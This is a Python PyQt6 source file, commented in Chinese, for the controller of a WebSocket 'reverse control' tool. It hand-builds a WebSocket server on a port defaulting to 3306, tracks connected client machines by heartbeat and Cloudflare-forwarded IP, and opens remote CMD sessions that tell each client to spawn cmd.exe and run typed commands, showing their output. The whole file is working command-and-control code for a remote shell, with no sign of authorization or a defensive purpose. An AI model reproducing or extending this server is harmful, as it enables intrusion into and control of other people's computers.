import sys
import os
import socket
import threading
import hashlib
import base64
import time
import struct
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer

WS_OP_CONTINUE = 0x00
WS_OP_TEXT = 0x01
WS_OP_BINARY = 0x02
WS_OP_CLOSE = 0x08
WS_OP_PING = 0x09
WS_OP_PONG = 0x0A


def ws_compute_accept(key: bytes) -> bytes:
    """计算标准Sec-WebSocket-Accept应答值"""
    magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    sha1 = hashlib.sha1(key + magic).digest()
    return base64.b64encode(sha1)


def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
    """服务端：对客户端带mask的payload解掩码"""
    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))


def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
    """构建服务端WebSocket帧：服务端禁止mask"""
    header = bytearray()
    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
    header.append(b1)

    length = len(payload)
    b2 = 0

    if length <= 125:
        b2 |= length
        header.append(b2)
    elif length <= 0xFFFF:
        b2 |= 126
        header.append(b2)
        header.extend(struct.pack(">H", length))
    else:
        b2 |= 127
        header.append(b2)
        header.extend(struct.pack(">Q", length))

    return bytes(header) + payload


def ws_parse_frame(data: bytearray):
    """解析WebSocket帧，返回 (fin, opcode, payload, consumed_bytes)"""
    if len(data) < 2:
        return (None, None, None, 0)
    p = 0
    b1 = data[p]
    p += 1
    b2 = data[p]
    p += 1

    fin = bool(b1 & 0x80)
    opcode = b1 & 0x0F
    has_mask = bool(b2 & 0x80)
    payload_len = b2 & 0x7F

    if payload_len == 126:
        if len(data) < p + 2:
            return (None, None, None, 0)
        payload_len = struct.unpack(">H", data[p:p+2])[0]
        p += 2
    elif payload_len == 127:
        if len(data) < p + 8:
            return (None, None, None, 0)
        payload_len = struct.unpack(">Q", data[p:p+8])[0]
        p += 8

    mask_key = b""
    if has_mask:
        if len(data) < p + 4:
            return (None, None, None, 0)
        mask_key = data[p:p+4]
        p += 4

    total_need = p + payload_len
    if len(data) < total_need:
        return (None, None, None, 0)

    raw_payload = data[p:p+payload_len]
    if has_mask:
        payload = ws_unmask_payload(raw_payload, mask_key)
    else:
        payload = raw_payload

    consumed = total_need
    return (fin, opcode, payload, consumed)


def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str]:
    """处理WebSocket HTTP GET 升级握手，返回 (成功与否, 真实IP字符串)"""
    buf = bytearray()
    start = time.time()
    try:
        while True:
            if time.time() - start > 8:
                return False, ""
            chunk = sock.recv(1024)
            if not chunk:
                time.sleep(0.01)
                continue
            buf.extend(chunk)
            if b"\r\n\r\n" in buf:
                break
    except Exception:
        return False, ""

    first_line = buf.split(b"\r\n")[0]
    parts = first_line.split(b" ")
    if len(parts) < 3:
        return False, ""
    method, path, proto = parts
    if path not in (b"/", b"/ws"):
        return False, ""

    headers = {}
    for line in buf.split(b"\r\n")[1:]:
        if not line:
            continue
        if b":" in line:
            k_raw, v_raw = line.split(b":", 1)
            k = bytes(k_raw).strip().lower()
            v = bytes(v_raw).strip()
            headers[k] = v

    real_ip = headers.get(b"cf-connecting-ip", b"").decode("utf-8").strip()

    conn_val = headers.get(b"connection", b"")
    upgrade_val = headers.get(b"upgrade", b"")
    ws_key = headers.get(b"sec-websocket-key")
    ws_version = headers.get(b"sec-websocket-version")

    if conn_val != b"Upgrade":
        return False, real_ip
    if upgrade_val != b"websocket":
        return False, real_ip
    if not ws_key:
        return False, real_ip
    if ws_version != b"13":
        return False, real_ip

    accept_val = ws_compute_accept(ws_key)

    resp = (
        b"HTTP/1.1 101 Switching Protocols\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: Upgrade\r\n"
        b"Sec-WebSocket-Accept: " + accept_val + b"\r\n"
        b"\r\n"
    )
    try:
        sock.sendall(resp)
    except Exception:
        return False, real_ip
    return True, real_ip


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, conn: socket.socket, display_ip: str):
        self.conn = conn
        self.ip_str = display_ip
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self._send_lock = threading.Lock()
        self._frag_buf = bytearray()
        self._frag_opcode = 0

    def send_packet(self, body: bytes) -> bool:
        """
        发送业务数据包
        body: 业务数据（如 b"EXEKdir"，不含长度头）
        自动添加 4 字节长度头并封装成 WS BINARY 帧
        """
        if not self.connected:
            return False
        try:
            # 加 4 字节长度头
            full_body = struct.pack(">I", len(body)) + body
            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, full_body)
            with self._send_lock:
                self.conn.sendall(ws_frame)
            return True
        except (OSError, BrokenPipeError):
            self.close()
            return False

    def reset_fragment(self):
        self._frag_buf.clear()
        self._frag_opcode = 0

    def close(self):
        self.connected = False
        try:
            frame_close = ws_build_server_frame(True, WS_OP_CLOSE, b"")
            self.conn.sendall(frame_close)
        except Exception:
            pass
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        self.client.send_packet(b"SPAW")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected:
            self.client.send_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

        self.setWindowTitle("WebSocket 反向控制主控端 (纯WS模式)")
        self.resize(720, 520)
        self.server_sock: socket.socket | None = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("3306")
        top_lay.addWidget(self.port_edit)

        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

        # 心跳定时器：10秒发一次PING
        self.ping_timer = QTimer(self)
        self.ping_timer.setInterval(10000)
        self.ping_timer.timeout.connect(self.broadcast_ping)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    @pyqtSlot()
    def broadcast_ping(self):
        for sess in list(self.client_model.items):
            if sess.connected:
                sess.send_packet(b"PING")

    def accept_loop(self):
        while self.server_running:
            try:
                raw_conn, addr = self.server_sock.accept()
                ok_handshake, real_ip = ws_handle_http_upgrade(raw_conn)
                if not ok_handshake:
                    self.log(f"WebSocket握手失败 {addr}")
                    raw_conn.close()
                    continue

                if real_ip:
                    display_ip = real_ip
                else:
                    display_ip = f"{addr[0]}:{addr[1]}"

                sess = ClientSession(raw_conn, display_ip)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"[新接入] {sess.ip_str}")
                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                t.start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            dlg.append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] WebSocket连接已经断开")
        self.client_model.remove_by_obj(sess)
        self.log(f"[断开] {sess.ip_str}")

    def client_recv_loop(self, sess: ClientSession):
        buf = sess._recv_buf
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)

                while True:
                    ret = ws_parse_frame(buf)
                    fin, opcode, payload, consumed = ret
                    if consumed <= 0:
                        break
                    del buf[:consumed]

                    # 处理控制帧
                    if opcode == WS_OP_PING:
                        pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
                        with sess._send_lock:
                            sess.conn.sendall(pong_frame)
                        continue
                    elif opcode == WS_OP_PONG:
                        continue
                    elif opcode == WS_OP_CLOSE:
                        break
                    elif opcode == WS_OP_TEXT:
                        # Postman调试用
                        text_msg = payload.decode("utf-8", errors="replace")
                        self.log(f"[DEBUG TEXT] {sess.ip_str}: {text_msg}")
                        continue
                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                        if opcode == WS_OP_BINARY:
                            sess.reset_fragment()
                            sess._frag_opcode = opcode
                        sess._frag_buf.extend(payload)
                        if fin:
                            full_body = bytes(sess._frag_buf)
                            sess.reset_fragment()
                            # 解析业务协议：4字节长度头 + body
                            if len(full_body) >= 4:
                                body_len = struct.unpack(">I", full_body[0:4])[0]
                                if len(full_body) >= 4 + body_len:
                                    body = full_body[4:4+body_len]
                                    if len(body) >= 4:
                                        cmd_code = body[0:4]
                                        if cmd_code == b"PONG":
                                            sess.last_pong = datetime.now()
                                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                                        elif cmd_code == b"OUTP":
                                            output_bytes = body[4:]
                                            out_text = output_bytes.decode("gbk", errors="replace")
                                            sess.signals.on_outp.emit(sess, out_text)

            except (OSError, ConnectionResetError):
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        self.log(f"启动 WS 服务器，监听 0.0.0.0:{port}")

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("0.0.0.0", port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()

        self.ping_timer.start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def stop_server(self):
        self.ping_timer.stop()
        self.server_running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("服务器已停止")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程CMD会话")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_open_cmd:
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
